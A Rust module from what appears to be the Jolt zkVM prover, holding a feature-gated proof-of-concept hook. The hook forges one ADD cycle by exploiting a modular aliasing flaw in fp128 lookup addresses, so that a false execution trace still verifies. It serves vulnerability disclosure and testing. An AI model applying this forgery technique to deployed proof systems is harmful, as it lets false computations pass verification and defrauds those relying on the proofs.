//! Malicious-prover hook for the fp128 lookup-address alias PoC.
//!
//! Compiled only under the `fp128-forgery-poc` feature, which no default,
//! release, or CI configuration enables. See
//! `AKITA_FP128_LOOKUP_ADDRESS_SOUNDNESS.md` for the soundness argument and
//! `crates/jolt-prover-legacy/tests/fp128_alias_forgery_e2e.rs` for the driver.
//!
//! ## What is forged
//!
//! Jolt's instruction-lookup address `k` ranges over `[0, 2^128)`, but the only
//! constraint tying `k` to the instruction's arithmetic is
//! `Σ_k ra(k)·Identity(k) = RightLookupOperand`, and `Identity(k) = k mod p`.
//! Over the Akita fp128 field `p = 2^128 - 2^32 + 22537 < 2^128`, so every
//! `k < 2^128 - p` has a second preimage `k + p` that is still a committable
//! 128-bit address. A prover that commits `k + p` satisfies the read-address
//! (RAF) leg and the R1CS operand constraint unchanged, but the table MLE reads
//! only the low `XLEN` address bits, so the lookup output becomes
//! `k - (2^128 - p) mod 2^64`.
//!
//! For the forgery to be a *complete* trace rather than a local inconsistency,
//! the register file must agree with the corrupted lookup output — otherwise
//! register read/write checking catches it. That is what the `exec` override in
//! [`super::add`] does: it writes the aliased table entry to `rd`. A real
//! attacker fabricates the trace directly; making the emulator produce it is
//! the cheapest way to get the same bytes.

use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

/// `2^128 - p` for the Akita fp128 modulus `p = 2^128 - 2^32 + 22537`. Any
/// honest lookup index strictly below this has an in-domain alias.
pub const ALIAS_WINDOW: u128 = 4_294_944_759;

/// Operands of the single `ADD` cycle to forge, matched in either
/// `(rs1, rs2)` order. Chosen so that
///
/// * the honest sum `3_234_567_902` is inside [`ALIAS_WINDOW`], and
/// * both values are below `RAM_START_ADDRESS` (`0x8000_0000`) and far from any
///   loop counter, so the pair cannot collide with pointer arithmetic
///   elsewhere in the trace.
pub const TARGET_LHS: u64 = 1_234_567_891;
pub const TARGET_RHS: u64 = 2_000_000_011;

/// Set by the PoC test around the traced run it wants corrupted. The honest and
/// forged runs happen in one process, so the hook is armed at runtime rather
/// than only at compile time.
static ARMED: AtomicBool = AtomicBool::new(false);

/// Number of executed cycles the hook actually corrupted. The test asserts this
/// is `0` for the honest run and exactly `1` for the forged run, so it cannot
/// silently pass by measuring two honest runs.
static FORGED_CYCLES: AtomicUsize = AtomicUsize::new(0);

pub fn arm() {
    ARMED.store(true, Ordering::Relaxed);
}

pub fn disarm() {
    ARMED.store(false, Ordering::Relaxed);
}

pub fn reset_counter() {
    FORGED_CYCLES.store(0, Ordering::Relaxed);
}

pub fn forged_cycles() -> usize {
    FORGED_CYCLES.load(Ordering::Relaxed)
}

/// Whether this `ADD` cycle is the forgery target. Pure predicate: the prover
/// re-derives the lookup index and output several times per cycle, so counting
/// here would over-count. [`note_forged_cycle`] is called once per *executed*
/// cycle instead.
pub fn is_target(x: u64, y: u64) -> bool {
    ARMED.load(Ordering::Relaxed)
        && ((x == TARGET_LHS && y == TARGET_RHS) || (x == TARGET_RHS && y == TARGET_LHS))
}

pub fn note_forged_cycle() {
    FORGED_CYCLES.fetch_add(1, Ordering::Relaxed);
}

/// The table entry at the aliased address: `low64(s + p) == s - (2^128 - p)`.
/// This is what the read leg proves, so the emulator must write it to `rd` for
/// the trace to be self-consistent.
pub fn forged_output(x: u64, y: u64) -> u64 {
    let honest = (x as u128).wrapping_add(y as u128);
    (honest as u64).wrapping_sub(ALIAS_WINDOW as u64)
}

/// The aliased one-hot address the prover commits instead of `honest`.
pub fn forged_lookup_index(honest: u128) -> u128 {
    /// `p = 2^128 - 2^32 + 22537`.
    const P: u128 = (u128::MAX - (1u128 << 32)) + 22537 + 1;
    honest.wrapping_add(P)
}
